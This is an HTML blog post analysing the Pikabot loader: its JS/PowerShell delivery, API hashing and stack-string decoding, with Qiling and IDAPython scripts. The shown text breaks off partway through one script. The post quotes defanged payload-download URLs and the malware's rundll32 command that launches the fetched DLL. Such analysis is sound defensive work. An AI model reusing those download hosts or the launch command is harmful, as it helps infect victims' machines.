<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Pikabot deep analysis - d01a</title><meta name="Description" content="Pikabot loader and core deep analysis"><meta property="og:title" content="Pikabot deep analysis" />
<meta property="og:description" content="Pikabot loader and core deep analysis" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://d01a.github.io/pikabot/" /><meta property="og:image" content="https://d01a.github.io/pikabot/featured-image.jpg"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-07-31T09:04:49+08:00" />
<meta property="article:modified_time" content="2023-08-01T03:18:11+03:00" /><meta property="og:site_name" content="d01a" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://d01a.github.io/pikabot/featured-image.jpg"/>
<meta name="twitter:title" content="Pikabot deep analysis"/>
<meta name="twitter:description" content="Pikabot loader and core deep analysis"/>
<meta name="application-name" content="d01a">
<meta name="apple-mobile-web-app-title" content="d01a"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/Luffy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://d01a.github.io/pikabot/" /><link rel="prev" href="https://d01a.github.io/aurora-stealer-builder/" /><link rel="next" href="https://d01a.github.io/syscalls/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Pikabot deep analysis",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/d01a.github.io\/pikabot\/"
        },"image": [{
                            "@type": "ImageObject",
                            "url": "https:\/\/d01a.github.io\/pikabot\/featured-image.jpg",
                            "width":  1200 ,
                            "height":  628 
                        }],"genre": "posts","keywords": "Malware Analysis, Reverse Engineering","wordcount":  3884 ,
        "url": "https:\/\/d01a.github.io\/pikabot\/","datePublished": "2023-07-31T09:04:49+08:00","dateModified": "2023-08-01T03:18:11+03:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "Mohamed Adel","logo": {
                    "@type": "ImageObject",
                    "url": "https:\/\/d01a.github.io\/images\/avatar.png",
                    "width":  715 ,
                    "height":  715 
                }},"author": {
                "@type": "Person",
                "name": "Mohamed Adel"
            },"description": "Pikabot loader and core deep analysis"
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="d01a"><span class="header-title-pre"><i class='fa-solid fa-skull' aria-hidden='true'></i></span>d01a</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/d01a" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="d01a"><span class="header-title-pre"><i class='fa-solid fa-skull' aria-hidden='true'></i></span>d01a</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/d01a" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content always-active" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Pikabot deep analysis</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://d01a.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Mohamed Adel</a></span>&nbsp;<span class="post-category">included in <a href="/categories/malware-analysis/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Malware Analysis</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-07-31">2023-07-31</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3884 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;19 minutes&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/featured-image.jpg"
        data-srcset="/pikabot/featured-image.jpg, /pikabot/featured-image.jpg 1.5x, /pikabot/featured-image.jpg 2x"
        data-sizes="auto"
        alt="/pikabot/featured-image.jpg"
        title="Pikabot loader and core deep analysis" /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#first-stage-js--powershell">First stage: JS &amp; PowerShell</a></li>
        <li><a href="#second-stage-pikabot-loader">Second stage: Pikabot Loader</a></li>
        <li><a href="#string-decryption">String decryption</a></li>
        <li><a href="#dynamic-api-resolving">Dynamic API resolving</a></li>
        <li><a href="#anti-analysis">Anti Analysis</a></li>
        <li><a href="#unpacking-core-module">Unpacking Core module</a></li>
        <li><a href="#third-stage-pikabot-core-module">Third stage: Pikabot Core module</a></li>
        <li><a href="#system-language-check">System language check</a></li>
        <li><a href="#anti-analysis-1">Anti Analysis</a></li>
        <li><a href="#hardcoded-mutex">Hardcoded Mutex!</a></li>
        <li><a href="#collect-victim-info">Collect victim info.</a></li>
        <li><a href="#c2-server-communication">C2 server communication</a></li>
        <li><a href="#c2-commands">C2 commands</a></li>
        <li><a href="#task">task</a></li>
        <li><a href="#balancer-and-init">balancer and init</a></li>
        <li><a href="#another-variants">Another Variants</a></li>
      </ul>
    </li>
    <li><a href="#yara-rule">Yara Rule</a></li>
    <li><a href="#iocs">IoCs</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="introduction">Introduction</h2>
<p>Pikabot is a new malware first seen in early 2023. It has two components: Loader and core module. It is still in its initial stages, expected to see increasing activity in the future.
Some researchers believe that it is linked to TA570 because of the similarity of delivering method between it and <code>Qbot</code> trojan. And the absence of <code>Qbot</code> activity in the period of <code>pikabot</code> activity.
The Loader usage is to perform a lot of Anti-debug, Anti-VM and Anti-emulation checks to make it harder for automated analysis and inject the core module.
The strings are obfuscated using the stack and simple Bitwise operation. The constant integers are obfuscated using structures and loops to get the right offset.
The core module has a lot of functionality that gives the attacker full control of the victim machine.</p>
<h2 id="analysis">Analysis</h2>
<h3 id="first-stage-js--powershell">First stage: JS &amp; PowerShell</h3>
<p>The infection starts with a malicious email containing a link that downloads a JS file that used to download <code>Pikabot</code> DLL. The sample discussed here can be found on <a href="https://www.malware-traffic-analysis.net/2023/05/23/index.html" target="_blank" rel="noopener noreffer ">malware-traffic-analysis</a> .
The threat actor tried to make the script look legit by embedding some comments related to MIT License of some opensource projects, <a href="https://github.com/madler/zlib/blob/master/zlib.h0" target="_blank" rel="noopener noreffer ">zlib</a> , <a href="https://github.com/nodeca/pako" target="_blank" rel="noopener noreffer ">pako</a> and <a href="https://github.com/nodeca/pako" target="_blank" rel="noopener noreffer ">react-redux</a>. Also, the names he used are not randomized and begin with <code>MIT</code>.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled.png"
        title="Untitled" width="1916" height="829" /></p>
<p>The script contains 1,759 lines of code. So, instead of wasting time trying to figure out what is going on, I debugged the script using the browser. Not too much appears but the string <code>PowerShell</code> is used. so, we can make use of PowerShell logging feature to catch the script for us.
I Enabled PowerShell Logging and Transcript logging that get the full PowerShell session with the output. Let the sample runs and check the logs:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%201.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%201.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%201.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%201.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%201.png"
        title="Untitled" width="1334" height="487" /></p>
<p>Checking the transcript log file created to see the full session.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%202.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%202.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%202.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%202.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%202.png"
        title="Untitled" width="1895" height="630" /></p>
<p>The first script is the RAW data the retrieved from the JS file and the second one is the decoded one. Let&rsquo;s look at the script. <a href="https://pastebin.com/emNXb6uN" target="_blank" rel="noopener noreffer ">pastebin</a></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%203.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%203.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%203.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%203.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%203.png"
        title="Untitled" width="1733" height="946" /></p>
<p>The first 6 Variables (numbered lines) weren&rsquo;t used anywhere in the code. They contain some invalid URLs and IPs. The list can be found in the following table.</p>
<ul>
<li>Note: Every variable contains not only one base64 encoded string but multiple, separated by a character. e.g., <code>$rifflers</code> uses <code>q</code> character as a separator and <code>$gentlewomanlike</code> that contains valid IP list uses <code>XO</code> as a separator. Just delete the separator and decode the string will work.</li>
</ul>
<table>
<thead>
<tr>
<th>URL</th>
<th>Status</th>
</tr>
</thead>
<tbody>
<tr>
<td>http[://]Supermysteries[.]creditcard</td>
<td>Not found</td>
</tr>
<tr>
<td>https[://]205.194.71[.]236</td>
<td>Not found</td>
</tr>
<tr>
<td>https[://]punishes[.]vacations</td>
<td>Not found</td>
</tr>
<tr>
<td>https[://]profiters[.]construction</td>
<td>Not found</td>
</tr>
<tr>
<td>https[://]83.99.144[.]199</td>
<td>Not found</td>
</tr>
<tr>
<td>http[://]whittret[.]hamburg</td>
<td>Not found</td>
</tr>
<tr>
<td>https[://]AdelochordaIntroverse[.]pizza</td>
<td>Not found</td>
</tr>
<tr>
<td>https[://]98.81.136[.]149</td>
<td>Not found</td>
</tr>
<tr>
<td>https[://]UnredeemedlyBeadeyes[.]land</td>
<td>Not found</td>
</tr>
<tr>
<td>http[://]81.179.42[.]197</td>
<td>Not found</td>
</tr>
<tr>
<td>http[://]Leavings[.]florist</td>
<td>Not found</td>
</tr>
<tr>
<td>http[://]55.112.208[.]170</td>
<td>Not found</td>
</tr>
<tr>
<td>http[://]wilded[.]parts</td>
<td>Not found</td>
</tr>
<tr>
<td>https[://]AlbergatriceRepaginated[.]xxx</td>
<td>Not found</td>
</tr>
<tr>
<td>http[://]heptameron[.]se</td>
<td>Not found</td>
</tr>
<tr>
<td>http[://]51.238.155[.]130</td>
<td>Not found</td>
</tr>
<tr>
<td>https[://]Bigeminy[.]tokyo</td>
<td>Not found</td>
</tr>
<tr>
<td>https[://]144.206.78[.]90</td>
<td>Not found</td>
</tr>
<tr>
<td>https[://]zeatin[.]marketing</td>
<td>Not found</td>
</tr>
<tr>
<td>http[://]countervene[.]agency</td>
<td>Not found</td>
</tr>
</tbody>
</table>
<p>Going back to the script, it iterates through the variable <code>$gentlewomanlike</code> using <code>XO</code> as a separator between each Base64-encoded string. There are more unused URLs in the script. But the used strings that initiate a request t them are:</p>
<ul>
<li>http[://]126.228.74[.]105/bm/IMgP</li>
<li>http[://]74.147.74[.]110/oc1Cs/lhdGK</li>
<li>http[://]227.191.163[.]233/eHDP/WLmO</li>
<li>http[://]151.236.14[.]179/DekOPg/Kmn40</li>
<li>http[://]192.121.17[.]92/JTi/IK2I8szLO</li>
<li>http[://]192.121.17[.]68/9Cm9EW/BVteE</li>
</ul>
<p>After Downloading the DLL, rundll32 to run It.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">start rundll32 $env:ProgramData\\forerankSomnolescent.EuthanasyUnblushingly,vips;MITLicense
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="second-stage-pikabot-loader">Second stage: Pikabot Loader</h3>
<p>To get the final payload, I used <code>unpacme</code>. for the unpacked sample, see <a href="https://www.unpac.me/results/0a65b4be-8ae6-4ced-8e2e-f333e85ac369#/" target="_blank" rel="noopener noreffer ">unpacme result</a></p>
<blockquote>
<p>NOTE: The unpacked DLL is broken so, if you want to debug the sample you can use this sample</p>
</blockquote>
<p>At the end of <code>DllEntryPoint</code> There is a call to the main function of the malware that contains all its functionality.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%204.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%204.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%204.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%204.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%204.png"
        title="Untitled" width="622" height="589" /></p>
<blockquote>
<p>All functions will have the same structure. First there is some code to obfuscate the numbers used later, then decoding the required strings and in the end, it will resolve the required functions and calls it.</p>
</blockquote>
<p>One of the first things the malware does is to resolve the required APIs. <code>Pikabot</code> resolves two functions that will be used to get the addresses of the required APIs; <code>GetProcAddress</code> and <code>LoadLibraryA</code> by searching through <code>Kernel32.dll</code> exports using a Hash of each API; <code>0x57889AF9</code> and <code>0x0B1C126D</code>, respectively.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%205.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%205.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%205.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%205.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%205.png"
        title="Untitled" width="811" height="261" /></p>
<h3 id="string-decryption">String decryption</h3>
<p>The malware uses stack strings followed by a single bitwise operation. The operation and the key are different throughout the strings so, the best option is to emulate this part to get the decoded strings.
The decoding operation takes a constant pattern as follows.</p>
<ol>
<li>Construct the stack strings.</li>
<li>loop all over the string to execute the decoding operation.</li>
<li>move the string to its location.</li>
<li>check <code>ecx</code> counter register against hardcoded string length.</li>
</ol>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%206.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%206.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%206.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%206.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%206.png"
        title="Untitled" width="398" height="515" /></p>
<p>I will use <a href="https://github.com/qilingframework/qiling" target="_blank" rel="noopener noreffer ">Qiling</a> in the emulation. First let&rsquo;s try with a single string.</p>
<blockquote>
<p>NOTE: The script did not run with me if the DLL is not located in a sub path of rootfs. For more information about the installation process look at the documentation or this blog.</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">qiling</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">qiling.const</span> <span class="kn">import</span> <span class="n">QL_VERBOSE</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">argv</span> <span class="o">=</span> <span class="p">[</span><span class="sa">r</span><span class="s2">&#34;qiling</span><span class="se">\\</span><span class="s2">examples</span><span class="se">\\</span><span class="s2">rootfs</span><span class="se">\\</span><span class="s2">x86_windows</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">bin</span><span class="se">\\</span><span class="s2">pika.dll&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">rootfs</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;qiling</span><span class="se">\\</span><span class="s2">examples</span><span class="se">\\</span><span class="s2">rootfs</span><span class="se">\\</span><span class="s2">x86_windows&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ql</span> <span class="o">=</span> <span class="n">Qiling</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="n">argv</span><span class="p">,</span> <span class="n">rootfs</span><span class="o">=</span><span class="n">rootfs</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="n">QL_VERBOSE</span><span class="o">.</span><span class="n">OFF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ql</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">begin</span><span class="o">=</span><span class="mh">0x10005542</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="mh">0x10005588</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ql</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">ql</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">ebp</span> <span class="o">-</span> <span class="mh">0x40</span> <span class="p">,</span><span class="n">ql</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">ecx</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">ql</span><span class="o">.</span><span class="n">emu_stop</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%207.png"
        data-srcset="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%207.png, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%207.png 1.5x, /pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%207.png 2x"
        data-sizes="auto"
        alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%207.png"
        title="Untitled" width="506" height="76" /></p>
<p>The first stack string is <code>AddVectoredExceptionHandler</code>. Now we want to make go decode all the strings of the binary.</p>
<blockquote>
<p>The method I will use here based on OALABS Blog</p>
</blockquote>
<p>How to locate where stack strings are decoded? Every Block of stack strings ends with <code>cmp REG, &lt;STRING_LENGTH&gt;</code> followed by a <code>jl</code>. So, if we locate this pattern, we can backtrack to find a sequence of <code>mov</code> instruction. How to do this?</p>
<ol>
<li>Locate every basic block end with <code>jl</code> and <code>cmp REG,&lt;constant&gt;</code></li>
<li>Record the address of <code>jl</code> + 0x4 as the emulation stop address.</li>
<li>backtrack to find the string offset. The first <code>mov</code> instruction starting from the end (<code>jl</code>)</li>
<li>Record the stack offset (first argument)</li>
<li>Find the first <code>mov</code> instruction as the emulation address.</li>
</ol>
<p>I tried to emulate it with <code>qiling</code> but it has some problems:</p>
<ol>
<li>Not using <code>ebp</code> register in all the references.</li>
<li>Too slow as <code>qiling</code> will load in every string decoding. (If loaded once, most of the strings will not be decoded as the address will be pointing to unmapped region of memory)</li>
</ol>
<blockquote>
<p>Qiling script will be helpful if you want to get a specific string.</p>
</blockquote>
<p>I wrote this script to manually decode the strings. can be found on my <a href="https://github.com/d01a/IDAPython_scripts/blob/master/Pikabot_string_decode.py" target="_blank" rel="noopener noreffer ">github</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ctypes</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">idc</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">idaapi</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">idautils</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_operand_offset</span><span class="p">(</span><span class="n">ea</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">op_offset</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="n">op_offset</span><span class="p">)</span><span class="o">.</span><span class="n">value</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_second_operand</span><span class="p">(</span><span class="n">ea</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">op_offset</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">get_operand_value</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
